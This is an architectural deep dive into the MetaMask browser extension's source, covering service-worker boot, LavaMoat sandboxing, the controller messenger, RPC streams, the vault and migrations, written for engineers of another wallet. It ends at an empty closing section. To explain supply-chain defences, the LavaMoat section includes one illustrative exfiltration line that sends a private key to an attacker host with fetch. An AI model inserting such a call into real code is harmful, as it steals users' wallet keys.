# MetaMask Extension — Architectural Deep Dive

> Analysis target: `(MetaMask source tree)` (commit-state of `master` at time of read).
> Audience: senior engineers building Nulo (Aztec MV3 wallet, Vue 3, monorepo, PXE in offscreen). Goal: cherry-pick useful patterns and document where MetaMask is over-engineered.

This is a study of a 1280-file, ~10k-line-per-file codebase with 206 migrations, ~5000 lines of LavaMoat policy, and roughly 80 named controllers. The point isn't to copy any of it. The point is to understand which abstractions earn their weight and which are organizational scar tissue from a 7-year-old codebase that ships to ~30M users while juggling Snaps, hardware wallets, MV2/MV3 dual support, four build flavors, and an arms race against supply-chain attacks.

---

## 1. Manifest & entry points

MetaMask still ships **two manifest variants in parallel** — V2 and V3 — at `app/manifest/v2/_base.json` and `app/manifest/v3/_base.json`. The build pipeline picks one at compile time based on a `--mv3=true|false` flag (see `development/build/manifest.js`).

**Why it matters:** in 2026, every other wallet has dropped MV2 — but MetaMask retains it because of webRequest-blocking phishing detection that was never fully matched in MV3. The V2 manifest still uses `"webRequestBlocking"`, while the V3 manifest leans on `"webRequest"` non-blocking + tab redirection (see `app/scripts/background.js:391` — `// we can use the blocking API in MV2, but not in MV3`).

**Entry points** (per `app/manifest/v3/_base.json`):

```json
"background": { "service_worker": "service-worker.ts" },
"action": { "default_popup": "popup-init.html" },
"side_panel": { "default_path": "sidepanel.html" },
"sandbox": { "pages": ["snaps/index.html"] },
"content_scripts": [
  { "js": ["scripts/contentscript.js"], "world": "ISOLATED" },
  { "js": ["scripts/inpage.js"], "world": "MAIN" },
  { "matches": ["*://connect.trezor.io/*/popup.html*"], "js": ["vendor/trezor/content-script.js"] }
]
```

Permissions worth noting: `alarms`, `offscreen`, `identity`, `sidePanel`, `cookies`, `webRequest`. The `cookies` permission exists for marketing-attribution flows from `metamask.io` (see `app/scripts/streams/cookie-handler-stream.ts`). The `identity` permission is for OAuth (Google / Apple in seedless onboarding).

The V3 CSP is meaningful:

```json
"content_security_policy": {
  "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; frame-ancestors 'none'; font-src 'self';",
  "sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ..."
}
```

The `wasm-unsafe-eval` permits the WASM binary used by `@metamask/ppom-validator` (transaction simulation) and signing libraries. The sandboxed page (`snaps/index.html`) gets `unsafe-eval` because Snaps runs untrusted JS through SES inside that page.

**Build flavors** are declared in `builds.yml`: `main`, `beta`, `experimental`, `flask`. `flask` flips `ALLOW_LOCAL_SNAPS: true` and `REQUIRE_SNAPS_ALLOWLIST: false`. Each flavor has its own LavaMoat policy under `lavamoat/webpack/{mv2,mv3}/{main,beta,experimental,flask}/`. That's 8 separate policy.json files times ~5000 lines = ~40k lines of generated policy that has to be regenerated and reviewed every dependency bump.

**HTML entries:** `home.html`, `popup.html`, `popup-init.html`, `sidepanel.html`, `notification.html`, `loading.html`, `offscreen.html`, `trezor-usb-permissions.html`, `background.html` (MV2 only). The `popup-init.html` is a thin pre-Init shell that shows a loading state while the service worker boots.

---

## 2. Service worker architecture

The MV3 service worker entry is `app/service-worker.ts:1` — a **15-line file that does almost nothing**:

```ts
// app/service-worker.ts:11
const lazyListener = new ExtensionLazyListener(chrome, {
  runtime: ['onInstalled', 'onConnect'],
});
globalThis.stateHooks.lazyListener = lazyListener;

// app/service-worker.ts:45
self.addEventListener('install', runImportScripts);
chrome.runtime.onConnect.addListener((port) => {
  port.postMessage({ data: { method: APP_INIT_LIVENESS_METHOD }, name: 'app-init-liveness' });
});
```

The pattern is genuinely interesting:

- `ExtensionLazyListener` (`app/scripts/lib/extension-lazy-listener/extension-lazy-listener.ts`) **buffers events** that fire before the bulky `background.js` finishes importing. When real listeners attach later, buffered calls are replayed. Without this, an `onInstalled` event during the very first install (when the SW is cold-starting) would be lost — the SW dies before any code can attach a listener.
- The actual wallet code (`background.js`, ~2625 lines) is loaded via dynamic `import()` inside `runImportScripts()` — invoked once per `install`, and again on subsequent activations via the `self.serviceWorker.state === 'activated'` check at `service-worker.ts:84`.
- Immediate liveness signal: every `onConnect` port gets a synchronous `app-init-liveness` postMessage so the popup UI can distinguish "background still starting" from "background dead". A second message — `BACKGROUND_INITIALIZED_METHOD` — is sent once `await isInitialized` resolves (`background.js:642`).

### Keep-alive: there are no `chrome.alarms`

I grepped the entire `app/` tree for `chrome.alarms` and `browser.alarms` — zero hits. The MV3 keep-alive is plain `setInterval` writing a timestamp to `chrome.storage.session` every 2 seconds:

```js
// app/scripts/background.js:851
const SAVE_TIMESTAMP_INTERVAL_MS = 2 * 1000;
saveTimestamp();
setInterval(saveTimestamp, SAVE_TIMESTAMP_INTERVAL_MS);
```

This is gated behind `PreferencesController.enableMV3TimestampSave`, defaulting to true. The setInterval extends the SW's idle timeout (Chrome resets the 30-second timer whenever extension API calls happen). It works because `chrome.storage.session.set` is an extension API call — but it's a hack and they know it (see comments at `background.js:849`: `// This keeps the service worker alive.`).

The **`onConnect` keep-alive** is more elegant: every popup/dApp port held open keeps the SW alive. When `openPopupCount === 0 && openSidePanelCount === 0 && !notificationIsOpen` the `setInterval` is the only thing left. The architecture leans on Chrome's "5-minute max keep-alive" tolerance and accepts that the SW will die between operations — every controller persists its state via the messenger pattern (see §4).

### State survival across SW termination

Three persistence layers:

1. **`chrome.storage.local`** — primary. Wrapped in `ExtensionStore` (`shared/lib/stores/extension-store.ts`) and managed via `PersistenceManager` (`shared/lib/stores/persistence-manager.ts:21`).
2. **IndexedDB backup database** — three "always-backup-these" controllers, declared inline:
   ```ts
   // shared/lib/stores/persistence-manager.ts:21
   export const backedUpStateKeys = [
     'KeyringController',
     'AppMetadataController',
     'MetaMetricsController',
   ] as const;
   ```
   Critical-error recovery (`app/scripts/lib/critical-error/`) reads from this when `chrome.storage.local` returns corrupted JSON. Storage corruption is a real production issue — see the `VaultCorruptionType` machinery at `shared/constants/state-corruption.ts`.
3. **`chrome.storage.session`** — survives SW termination but not browser restart. Used for `isFirstMetaMaskControllerSetup` (so reset-on-restart logic only fires on cold install) and the keep-alive timestamp.

There's a `storageKind: 'data' | 'split'` setting (`persistence-manager.ts:19`). In `'data'` mode the entire blob is read/written as one key. In `'split'` mode each controller gets its own key — written incrementally on `stateChange` (see `background.js:1596-1640`). They're rolling out `split` storage to dodge the chrome.storage.local "must serialize the entire blob" performance cliff once total state grows past a few MB.

### Boot sequence

```
service-worker.ts:install
  → runImportScripts() → import('./scripts/background.js')
    → background.js (top-level): persistenceManager init, lazyListener wiring
    → onConnect listener installed BEFORE async init kicks off
    → initialize(backup) async:
        - createOffscreen() (MV3 only)
        - loadStateFromPersistence(backup)  ← runs migrations 002–207
        - browser.storage.session.get([isFirstMetaMaskControllerSetup])
        - loadPreinstalledSnaps() over network with timeout
        - cronjobControllerStorageManager.init()
        - setupController(initState, ...)
            - new MetamaskController(...) — 80+ controllers via #initMessengerClients
            - persistenceManager.setOnSetFailed(...)
            - controller.store.on('stateChange', persistenceManager.update)
            - setupEnsIpfsResolver(...)
            - assigns connectWindowPostMessage, connectEip1193, connectCaipMultichain
        - maybeDetectPhishing(controller)
        - new DeepLinkRouter(...).install()
    → resolveInitialization() (deferred Promise resolves)
    → queued onConnect calls drain through connectWindowPostMessage
```

The `await isInitialized` pattern at `background.js:637` is critical: every port connection attempt blocks on a deferred promise resolved only after `setupController` finishes. This is **the** pattern for handling the MV3 cold-start race condition. Nulo should copy it.

### Controller rehydration

There is no fancy rehydration. Each controller's `init` function (`messenger-client-init/*`) is passed the `persistedState` extracted from disk by the migrator. The controller's constructor accepts `state: persistedState.X` and that's the rehydration. State is reactive via the messenger pattern: when a controller calls `this.update(...)` (BaseController v2), it emits a `${name}:stateChange` event; `ComposableObservableStore` subscribes to all of these and aggregates into a single observable (`app/scripts/lib/ComposableObservableStore.js:71`).

---

## 3. LavaMoat / SES — what it actually does

The `lockdown-*` files are a five-minute read but represent ~6 months of engineering debt for the MetaMask team:

```js
// app/scripts/lockdown-run.js:4
lockdown({
  consoleTaming: 'unsafe',
  errorTaming: 'unsafe',
  domainTaming: 'unsafe',
  overrideTaming: 'severe',
});
```

`lockdown()` is from `ses` (Hardened JavaScript / TC39 SES proposal). It freezes all standard intrinsics: `Object`, `Array`, `Promise.prototype`, etc. become `[[Configurable]]: false, [[Writable]]: false`. After lockdown, no library can monkey-patch `Array.prototype.map` to exfiltrate data — a classic supply-chain attack vector.

`lockdown-more.js` (105 lines) goes further by also hardening `eval`, `Function`, and `Symbol` plus all named globals enumerable from a fresh `Compartment().globalThis`. This is the "lockdown didn't quite finish the job, here's the missing pieces" file — pure scar tissue.

`lockdown-install.js` is one line: `import 'ses';` — separating the side-effecting import from the actual `lockdown()` call lets the build inject `ses` into specific bundle slots.

### LavaMoat policies

`lavamoat/webpack/mv3/main/policy.json` is **5053 lines**. `lavamoat/browserify/main/policy.json` is **6800 lines**. Combined across the four flavors and two build systems, it's roughly **40k lines of generated policy**. Each entry looks like:

```json
"@ethereumjs/tx>@ethereumjs/util": {
  "globals": { "console.warn": true, "fetch": true },
  "packages": {
    "@ethereumjs/tx>@ethereumjs/rlp": true,
    "@ethereumjs/tx>@ethereumjs/util>ethereum-cryptography": true,
    "webpack>events": true
  }
}
```

LavaMoat **wraps every npm package in a Compartment** at runtime. A Compartment is a SES construct that gets its own copy of `globalThis` containing only the globals/packages the policy explicitly grants. So `@ethereumjs/util` in the bundle cannot call `fetch` unless the policy says `"fetch": true`.

**Cost vs benefit:**
- Cost: every dep bump regenerates policy via `yarn lavamoat:webpack:auto`. CI fails when the policy diff is non-trivial. An entire `.github/workflows/update-lavamoat-policies.yml` exists just to manage this. Bundle size ~25-30% larger from compartmentalization wrappers.
- Benefit: the `event-stream`, `flatmap-stream`, `ua-parser-js`, `colors` series of supply-chain attacks would have been neutralized at runtime. A malicious package update introducing `fetch('https://attacker/' + privateKey)` would fail because the policy doesn't grant `fetch` to that package.

For Nulo: this is industrial-strength paranoia. Worth it for a wallet with $X billions under custody and a 7-year supply-chain attack surface. **For an Aztec wallet pre-mainnet, defer until traction**. The single highest-value thing you can do today is `--frozen-lockfile`, automated dependabot, a small dep set, and a pre-commit `bun audit`. SES + LavaMoat is the next tier.

There's also `app/scripts/use-snow.js` — 30 lines that integrate [Snow](https://github.com/LavaMoat/snow) to detect and harden newly-created realms (e.g., when a malicious script tries to escape via `<iframe>.contentWindow`). This is overkill for non-MetaMask scale.

---

## 4. Controller architecture — `metamask-controller.js` is mostly wiring

`metamask-controller.js` is 10,113 lines. The first reaction is "god class". The reality is more nuanced: ~90% of those lines are **wiring**, not business logic. Business logic lives in the 80+ controllers under `app/scripts/controllers/` and in upstream `@metamask/*-controller` packages (network-controller, transaction-controller, keyring-controller, accounts-controller, etc.).

### The messenger pattern

Two layers exist, evolving over time:

**BaseController v2** (`@metamask/base-controller`): each controller declares its state, metadata describing which parts persist, and explicit Action/Event types. State updates use Immer's `produce` and emit `${name}:stateChange` with patches. Example shape from `app/scripts/controllers/preferences-controller.ts:34-75`:

```ts
const controllerName = 'PreferencesController';

export type PreferencesControllerGetStateAction =
  ControllerGetStateAction<typeof controllerName, PreferencesControllerState>;

export type PreferencesControllerStateChangeEvent =
  ControllerStateChangeEvent<typeof controllerName, PreferencesControllerState>;

export type AllowedActions =
  | AccountsControllerGetAccountByAddressAction
  | AccountsControllerSetAccountNameAction;

export type PreferencesControllerMessenger = Messenger<
  typeof controllerName,
  PreferencesControllerActions | AllowedActions,
  PreferencesControllerEvents
>;
```

**Messenger / RestrictedMessenger** (`@metamask/messenger`): a typed pub-sub bus. Controllers don't import each other — they `messenger.call('OtherController:method', args)` and `messenger.subscribe('OtherController:stateChange', cb)`. The messenger pattern is delegated explicitly (see `app/scripts/messenger-client-init/messengers/app-state-controller-messenger.ts:27-37`):

```ts
messenger.delegate({
  messenger: appStateControllerMessenger,
  actions: [
    'ApprovalController:addRequest',
    'KeyringController:getState',
    'PreferencesController:getState',
  ],
  events: ['KeyringController:unlock', 'PreferencesController:stateChange'],
});
```

If `AppStateController` tries to call `'TokenListController:getState'` without explicit delegation, TypeScript fails. This is the **single best thing in MetaMask's architecture**: it transforms accidental coupling between 80 controllers into compile-time errors. Every cross-controller dependency is a documented edge in the dep graph.

### `metamask-controller.js` — the wiring graph

The constructor (`metamask-controller.js:516-1564`) builds:

1. The root messenger (`getRootMessenger()` from `app/scripts/lib/messenger.ts:30`) — the only un-restricted Messenger instance.
2. A `messengerClientInitFunctions` map listing 80+ init functions (`metamask-controller.js:625-736`):
   ```js
   const messengerClientInitFunctions = {
     ApprovalController: ApprovalControllerInit,
     KeyringController: KeyringControllerInit,
     NetworkController: NetworkControllerInit,
     // ... 80 more
     LegacyBackgroundApiService: LegacyBackgroundApiServiceInit,
   };
   ```
3. `#initMessengerClients()` iterates the map. Each entry pulls a `getMessenger(rootMessenger)` factory from `MESSENGER_FACTORIES` and a `getInitMessenger(rootMessenger)` factory, calls the controller's init function with `{ controllerMessenger, initMessenger, persistedState, getMessengerClient }`, and collects the result.
4. Controllers expose themselves via `messengerClientsByName`. `metamask-controller.js:754-866` is just `this.X = messengerClientsByName.X` for backwards-compatibility with code that grew up before the init pattern existed.

The init functions (`app/scripts/messenger-client-init/`) are tiny — `keyring-controller-init.ts` is 121 lines and is mostly hardware-keyring builders. The real init logic is encapsulated:

```ts
// app/scripts/messenger-client-init/keyring-controller-init.ts:110
const messengerClient = new KeyringController({
  state: persistedState.KeyringController,
  messenger: controllerMessenger,
  keyringBuilders: additionalKeyrings,
  encryptor: encryptor || encryptorFactory(600_000),
});
```

### `ComposableObservableStore` — state aggregation

`app/scripts/lib/ComposableObservableStore.js:18-98` glues the controller messenger system to a single observable for the UI:

```js
// app/scripts/lib/ComposableObservableStore.js:71
this.controllerMessenger.subscribe(
  `${store.name}:stateChange`,
  (state, patches) => {
    if (this.#changedPersistedProperty(config[key].metadata, patches)) {
      this.#onStateChange(key, getPersistentState(state, config[key].metadata), patches);
    }
  },
);
```

There are **two stores**: `this.store` (persisted only) and `this.memStore` (memory only — includes `KeyringController.isUnlocked` and other ephemeral state). The UI gets `memStore` over the wire; persistence writes from `store`. The metadata system (`StateMetadata`) marks each top-level state property as `persist: boolean, anonymous: boolean` — the latter for Sentry redaction.

### Verdict

`metamask-controller.js` **is** a god file, but only because backwards compatibility forced it: every external integration referenced `controller.txController.foo`, so killing the property assignments would break all downstream code. The new pattern (`messenger-client-init/`) is good — the 1700+ controller init test files (`*.init.test.ts`) prove the controllers themselves can be tested in near-total isolation. If MetaMask were rebuilt from scratch tomorrow, `metamask-controller.js` would be ~500 lines: instantiate root messenger, run init loop, wire the streams.

For Nulo: the MetaMask messenger pattern is **the** lesson here. You don't need `ComposableObservableStore` (Pinia handles aggregation), but the typed cross-service Action/Event pattern enforced via TypeScript delegation is genuinely brilliant. Your `Service<Methods, Events>` is in the same family — keep going in that direction and codify it the way `@metamask/messenger` does.

---

## 5. UI ↔ Background — streams, multiplex, and PatchStore

The UI ↔ background communication runs on **duplex object streams over `chrome.runtime.connect` ports**, multiplexed by `@metamask/object-multiplex`.

### Connection setup

When the popup opens, `app/scripts/background.js:1710-1817` runs `connectWindowPostMessage`:

```js
// app/scripts/background.js:1722
const portStream = new ExtensionPortStream(remotePort);
controller.isClientOpen = true;
controller.setupTrustedCommunication(portStream, remotePort.sender);
```

`setupTrustedCommunication` (`metamask-controller.js:7084-7099`) creates a multiplex over the port and exposes three substreams:

```js
// metamask-controller.js:7086
const mux = setupMultiplex(connectionStream);
const { initializePatchStore, patchesPromise } =
  this.setupPatchStoreConnection(mux.createStream('patch-store'));
this.setupControllerConnection(mux.createStream('controller'), { initializePatchStore });
this.setupProviderConnectionEip1193(
  mux.createStream('provider'),
  sender,
  SubjectType.Internal,
);
```

Three streams over one port:
- `controller` — generic RPC for UI actions (`createNewVault`, `setLocked`, `submitPassword`, etc.).
- `patch-store` — incremental Immer patches sent on each `memStore` change. The UI applies them to redux state.
- `provider` — even the popup gets an EIP-1193 provider so it can sign things via the same path dApps use (subjectType `Internal`).

### The `controller` stream — RPC over JSON-RPC

`createMetaRPCHandler` (`app/scripts/lib/createMetaRPCHandler.js:4-49`) is **45 lines** of pure protocol:

```js
// app/scripts/lib/createMetaRPCHandler.js:4
const createMetaRPCHandler = (api, outStream) => {
  return async (data) => {
    if (!api[data.method]) {
      outStream.write({
        jsonrpc: '2.0',
        error: rpcErrors.methodNotFound({ message: `${data.method} not found` }),
        id: data.id,
      });
      return;
    }
    let result, error;
    try {
      result = await api[data.method](...data.params);
    } catch (err) { error = err; }
    outStream.write(error
      ? { jsonrpc: '2.0', error: serializeError(error), id: data.id }
      : { jsonrpc: '2.0', result, id: data.id });
  };
};
```

The `api` is a dictionary of bound methods declared at `metamask-controller.js:10012`-ish — `setupUntrustedCommunicationEip1193`, `createNewVaultAndKeychain`, `setLocked`, `submitPassword`, ~200 entries. UI calls `submitRequestToBackground('createNewVaultAndKeychain', [password])` on `ui/store/background-connection.ts` and the JSON-RPC round-trips.

### The `patch-store` stream — Immer patches

`PatchStore` (`app/scripts/lib/PatchStore.ts`) listens on `memStore`'s `stateChange` event, normalizes the Immer patches (root-level patches get exploded into per-property patches to avoid clobbering other controllers — see `_normalizeEventPatches` at `PatchStore.ts:134-153`), and sends them down the substream. The UI dispatches an `updateMetamaskState` action that merges the patches into Redux.

This is **way more efficient** than sending the full state on every change. State for an active wallet user is easily multi-MB once token lists, NFT lists, transaction history, and Snap state accumulate. Sending patches keeps the UI ↔ BG bandwidth proportional to actual changes, not to total state.

### Redux setup in UI

`ui/store/store.ts:65-85`:

```ts
return baseConfigureStore({
  reducer: rootReducer as unknown as Reducer<ReduxState>,
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware({
      serializableCheck: false,
      immutableCheck: false,
    }),
  devTools: false,
  enhancers,
  preloadedState,
});
```

`serializableCheck` and `immutableCheck` are off for performance — the state is too big for those checks to be cheap. Initial state is preloaded synchronously during `launchMetamaskUi` (`ui/index.js:127`). The redux store is created **after** the UI receives the first complete state snapshot from the background.

### Verdict

The dual-stream design (RPC + patches) is genuinely elegant. The patch-store pattern is portable: any state you can serialize through Immer can be patch-streamed. For Nulo, this is **directly applicable** — your popup ↔ SW currently uses `Service<Methods, Events>` for RPC, but state synchronization happens via discrete `onProfileUpdated` event broadcasts. As your state graph grows, consider a single `state-patches` event with normalized Immer patches instead of N event subscriptions. This scales better and avoids forgotten subscription wires.

---

## 6. dApp ↔ Background — provider injection and JsonRpcEngine

### Injection chain

```
inpage.js (page world, MAIN)
   ↓ WindowPostMessageStream
contentscript.js (extension isolated world)
   ↓ ExtensionPortStream → chrome.runtime.connect
background.js → handleOnConnect → connectEip1193(portStream)
   → controller.setupUntrustedCommunicationEip1193({ connectionStream, sender })
       → setupProviderConnectionEip1193 → JsonRpcEngine + middleware stack
```

`inpage.js` (130 lines, `app/scripts/inpage.js`):

```js
// app/scripts/inpage.js:64
const metamaskStream = new WindowPostMessageStream({
  name: INPAGE,
  target: CONTENT_SCRIPT,
});
const mux = new ObjectMultiplex();
pipeline(metamaskStream, mux, metamaskStream, (error) => { ... });

initializeProvider({
  connectionStream: mux.createStream(METAMASK_EIP_1193_PROVIDER),
  // ...
  providerInfo: {
    uuid: uuid(),
    name: process.env.METAMASK_BUILD_NAME,
    icon: process.env.METAMASK_BUILD_ICON,
    rdns: process.env.METAMASK_BUILD_APP_ID,
  },
});
```

Note **no graceful shutdown handlers in `inpage.js`** — the file is full of comments explaining why (`inpage.js:71-101`). The page context dies with the page, and adding handlers caused 3.8M errors/month in Sentry for "Premature close". The fact that they have a comment block longer than the actual code is a sign of operational scar tissue: this matters when you ship to 30M users.

### JsonRpcEngine middleware stack

`metamask-controller.js:7724-8213` — `setupProviderEngineEip1193()`. The middleware push order is the request execution order:

```js
// metamask-controller.js:7732
const engine = new JsonRpcEngine();
engine.push(createOriginMiddleware({ origin }));               // tag every req with origin
if (mainFrameOrigin) engine.push(createMainFrameOriginMiddleware({ mainFrameOrigin }));
engine.push(createSelectedNetworkMiddleware(this.controllerMessenger)); // per-domain network
if (tabId) engine.push(createTabIdMiddleware({ tabId }));
if (typeof frameId === 'number') engine.push(createFrameIdMiddleware({ frameId }));
engine.push(createLoggerMiddleware({ origin }));
engine.push(this.permissionLogController.createMiddleware());
engine.push(createTracingMiddleware());                        // Sentry spans
engine.push(createOriginThrottlingMiddleware({...}));          // rate-limit per origin
engine.push(this.eip7715BlockingMiddleware);                   // block during permission req
engine.push(createPPOMMiddleware(...));                        // tx simulation security
engine.push(createDappSwapMiddleware({...}));                  // dapp-swap routing
engine.push(createTrustSignalsMiddleware(...));                // phishing alerts
engine.push(createRPCMethodTrackingMiddleware({...}));         // metrics
engine.push(createUnsupportedMethodMiddleware());              // 405s
engine.push(asLegacyMiddleware(createWalletSnapPermissionMiddleware()));
engine.push(createEthAccountsMethodMiddleware({...}));         // legacy eth_accounts
if (subjectType !== SubjectType.Internal) {
  engine.push(createPermissionMiddleware({ origin, messenger })); // permission gate
  engine.push(createDefiReferralMiddleware(...));              // referral tracking
}
if (subjectType === SubjectType.Website) {
  engine.push(createOnboardingMiddleware({...}));              // dapp asks for setup
}
// ... more middleware (CAIP routing, snap RPC routing) ...
engine.push(filterMiddleware);                                  // eth_subscribe filters
engine.push(subscriptionManager.middleware);                    // active subscriptions
engine.push(this.metamaskMiddleware);                          // wallet RPC methods
engine.push(this.eip5792Middleware);                           // wallet_sendCalls etc.
engine.push(providerAsMiddleware(proxyClient.provider));       // tail: real RPC node
```

There's a comparable Caip flow at `setupProviderEngineCaip` (`metamask-controller.js:8227-`). Both stacks differ slightly because CAIP wallets have a session-based permission model.

### The permission and approval flow

`createPermissionMiddleware` is from `@metamask/permission-controller`. When a dApp calls `wallet_requestPermissions` or `eth_requestAccounts`, the middleware reaches into the `PermissionController`, which stages a request via `messenger.call('ApprovalController:addRequest', ...)`. The `ApprovalController` adds it to its `pendingApprovals` map, fires a state change, the badge count updates, the popup opens via `notificationManager`, the user clicks approve, the popup calls `controller.approve(id)` (over the `controller` stream), `ApprovalController:acceptRequest` fires, the deferred promise inside the middleware resolves, and the request continues.

The whole flow is a state-machine carved into `addRequest` / `acceptRequest` / `rejectRequest` triplets. This is portable to Nulo and worth absorbing.

---

## 7. KeyringController & vault

The vault format is determined by the encryptor passed into `KeyringController`. MetaMask uses `@metamask/browser-passworder` with **PBKDF2 at 600,000 iterations** (`app/scripts/messenger-client-init/keyring-controller-init.ts:114`):

```ts
encryptor: encryptor || encryptorFactory(600_000)
```

The factory (`app/scripts/lib/encryptor-factory.ts:24-122`) wraps `browser-passworder`'s `encrypt`, `encryptWithDetail`, `keyFromPassword`, and `isVaultUpdated` with a fixed iteration count. When users from older versions log in, `isVaultUpdated()` returns `false` and the controller re-encrypts on next save (this is `KeyringController` upstream behavior).

**No scrypt, no Argon2.** OWASP recommends 600k PBKDF2-SHA256 as of 2023 — MetaMask sits exactly there. PBKDF2 is GPU-accelerable; scrypt would be safer. The reason they don't use scrypt is path-dependence: changing the KDF is a vault re-encryption per user, hundreds of millions of vault rotations.

### Keyring types

From `metamask-controller.js:15-30`, the keyring builders include:
- `HD Key Tree` (BIP39 mnemonic, default).
- `Simple Key Pair` (raw private key import).
- `Snap Keyring` — every Snap-based keyring (Bitcoin, Solana, Cosmos, etc.) routes through here.
- `Trezor`, `Ledger`, `OneKey`, `Lattice`, `QR Keyring` (KeystoneHQ).

Hardware wallets in MV3 require the offscreen document because they can't hold USB connections from the SW directly. `keyring-controller-init.ts:88-103` swaps `TrezorOffscreenBridge`, `LedgerOffscreenBridge`, etc. when `isManifestV3 === true`. The offscreen bridges proxy USB API calls back to the SW via post-message-stream.

### Unlock state

`KeyringController.isUnlocked` is non-persisted (it's in `memStore`, not `store`). On SW restart, the wallet is locked. `_loginUser(password)` (`metamask-controller.js:1532`) is invoked at boot **only** if `process.env.PASSWORD` is set (test-only). Real users always re-enter their password after SW termination.

There's a subtle interaction with seedless onboarding: the `SeedlessOnboardingController` can store a re-encryption key derived from a Web2 OAuth login in IndexedDB so that a "Continue with Google" flow can unlock the vault without password entry. This is a separate trust model that some Nulo users may or may not want.

### SRP handling

Seed phrases never leave the keyring controller. Reveal flows route through `KeyringController:exportSeedPhrase` (gated by `addRequest` in ApprovalController so the user explicitly confirms in the popup). The seed phrase is held in memory only when actively shown — UI components clear it on unmount.

---

## 8. JsonRpcEngine middleware — quick stack reference

(See §6 for the dApp-side stack.) Internal calls use a different chain. `this.metamaskMiddleware` (constructed at `metamask-controller.js` further down) handles wallet-side RPC methods — `eth_accounts`, `wallet_addEthereumChain`, `wallet_switchEthereumChain`, `wallet_watchAsset`, etc. — by bridging into the appropriate controller method. After it, `providerAsMiddleware(proxyClient.provider)` is the tail, which proxies the request to the network's actual JSON-RPC endpoint (Infura, custom RPC, or test network).

The `selected-network-controller` deserves a callout. Each dApp origin can target a different chain. The `proxyClient` (`metamask-controller.js:7750`) is a per-origin proxy whose underlying provider can be hot-swapped when the user changes the chain for that origin. This avoids creating new JsonRpcEngine instances per origin chain change.

For Nulo: the `JsonRpcEngine` from `@metamask/json-rpc-engine` is **portable**, well-typed, and bug-tested. If you want EIP-1193 compatibility shims for any reason (interop with eth/sol dApps that expect the spec), reusing this engine is cheaper than rolling your own.

---

## 9. Snaps

Snaps are MetaMask's third-party plugin system: each Snap is npm-published JS run inside a sandboxed compartment with a permissioned API.

### Execution environment

Two environments based on platform:
- **MV3 Chrome**: `OffscreenExecutionService` from `@metamask/snaps-controllers`. The offscreen document loads `snaps/index.html` which is a sandboxed page (declared at `app/manifest/v3/_base.json:94` — `"sandbox": { "pages": ["snaps/index.html"] }`). Inside, `ProxySnapExecutor.initialize(parentStream, './snaps/index.html')` (`app/offscreen/offscreen.ts:26`) sets up the SES execution.
- **MV2 / Firefox**: `IframeExecutionService` — Snaps run in iframes loaded from `https://execution.metamask.io/iframe/11.0.1/index.html` (see `builds.yml:32`). Yes, the iframe is loaded from a remote URL — this is intentional because the MV2 sandbox model can't replicate MV3's offscreen sandbox.

### Communication

`app/scripts/messenger-client-init/snaps/execution-service-init.ts:51-66`:

```ts
function setupSnapProvider(snapId: string, connectionStream: Duplex) {
  setupUntrustedCommunicationEip1193({
    connectionStream,
    sender: { snapId },
    subjectType: SubjectType.Snap,
  });
  const mux = setupMultiplex(connectionStream);
  mux.ignoreStream(METAMASK_EIP_1193_PROVIDER);
  setupUntrustedCommunicationCaip({
    connectionStream: mux.createStream(METAMASK_CAIP_MULTICHAIN_PROVIDER),
    sender: { snapId },
    subjectType: SubjectType.Snap,
  });
}
```

Each Snap gets the same JSON-RPC engine treatment as a website, just with `subjectType: SubjectType.Snap`. Permissions and capabilities flow through the `@metamask/permission-controller` system — Snaps declare endowments in their manifest (`endowment:rpc`, `endowment:network-access`, `snap_dialog`, etc.), the user approves at install time, and the middleware enforces.

**For Nulo: skip Snaps entirely**. The complexity is enormous (SES sandbox, capability enforcement, runtime endowment checks, attestation, allow-list management) for the value of "third parties can extend our wallet". Aztec's privacy model + custom account contracts are sufficient extension points for the foreseeable future. If Aztec eventually needs a Snaps-like extension system, you'll have years of road map first.

---

## 10. Migrations

206 migration files at `app/scripts/migrations/{002.js,003.js,...,207.ts}`. Pattern (`app/scripts/migrations/207.ts:54-76`):

```ts
export const version = 207;

export async function migrate(
  versionedData: VersionedData,
  localChangedControllers: Set<string>,
): Promise<void> {
  versionedData.meta.version = version;
  const changedVersionedData = cloneDeep(versionedData);
  try {
    transformState(changedVersionedData.data, changedLocalChangedControllers);
    versionedData.data = changedVersionedData.data;
    changedLocalChangedControllers.forEach((c) => localChangedControllers.add(c));
  } catch (error) {
    captureException(new Error(`Migration #${version}: ${getErrorMessage(error)}`));
  }
}
```

`Migrator` (`app/scripts/lib/migrator/index.js:37-123`) runs them sequentially. Two regimes split at `MIGRATION_V2_START_VERSION = 186`:
- `<186`: legacy. Migration returns new versioned data; all controllers assumed changed.
- `>=186`: in-place mutation; migration reports which controllers it modified. Required for split-state storage so only changed keys get re-written.

A migration that throws **does not break the boot** — the migrator catches, emits `error`, breaks the loop, and the wallet boots with whatever state it managed to migrate. This is the right default: a botched migration shouldn't lose user funds. Sentry catches the failure for the next release.

For Nulo: this pattern is portable. Critical things:
- Migrations run in numeric order, version-gated.
- Each migration mutates `state` in place and bumps `meta.version`.
- Failed migrations are non-fatal — log to Sentry, stop, ship the next release.
- Test files for each migration are co-located (`207.test.ts`).

You probably don't need 200 migrations for Nulo right now — but the framework should be in place from day one. **Storage migrations are the single thing nobody can retrofit later** without considerable pain.

---

## 11. Build & tooling

Two build systems coexist:

- **Browserify** (`development/build/`): the legacy build, used for production releases for years. Slower but battle-tested with the LavaMoat browserify plugin.
- **Webpack** (`development/webpack/build.ts`): the new build, with Webpack-LavaMoat. Faster CI, smaller diffs.

Each has its own LavaMoat policy directory (`lavamoat/browserify/` and `lavamoat/webpack/`). Some packages are listed in both because each build system has different inlining rules — `@ethereumjs/util>ethereum-cryptography>@noble/curves` collapses to a direct import in webpack but stays nested in browserify.

`development/generate-lavamoat-policies.js` regenerates policies after dependency changes. CI runs `yarn lavamoat:webpack:auto` and fails if `git diff` is non-empty.

Build flavors are processed via the `builds.yml` config and a feature-flag system (`features:` arrays) plus AST transforms that delete code surrounded by sentinel comments at compile time. This is custom. It works.

For Nulo: **don't replicate this**. Use Vite or Vinxi, one build configuration, one bundle per browser. If you need Flask-style preview builds, use a query parameter or a build env. The cost of MetaMask's build pipeline complexity is paid in CI minutes every PR.

---

## 12. What's worth stealing for Nulo

The high-value, low-cost imports:

